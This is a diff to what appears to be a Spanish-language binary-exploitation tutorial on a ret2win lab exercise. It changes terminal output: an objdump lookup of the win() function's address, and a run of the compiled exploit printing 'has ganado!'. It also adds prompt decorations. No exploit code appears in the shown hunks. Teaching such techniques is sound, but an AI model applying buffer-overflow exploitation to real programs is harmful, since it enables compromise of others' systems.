@@ -34,9 +34,10 @@ conseguir direccion en memoria de la funcion wins():
 
 ``` bash
 
-objdump -d vuln | grep win
-
+❯ objdump -d vuln | grep "win"
 08049176 <win>:
+╭─ ~/pwn                                                                                                           ✔ ─╮
+╰─                                                                                                                   ─╯
 
 ```
 ``` py
@@ -243,3 +244,14 @@ int main() {
 gcc exploit.c -o exploit -m32
 
 ```
+
+``` bash
+
+❯ ./exploit
+has ganado!
+╭─ ~/pwn                                                                                                           ✔ ─╮
+╰─                                                                                                                   ─╯
+
+```
+
+
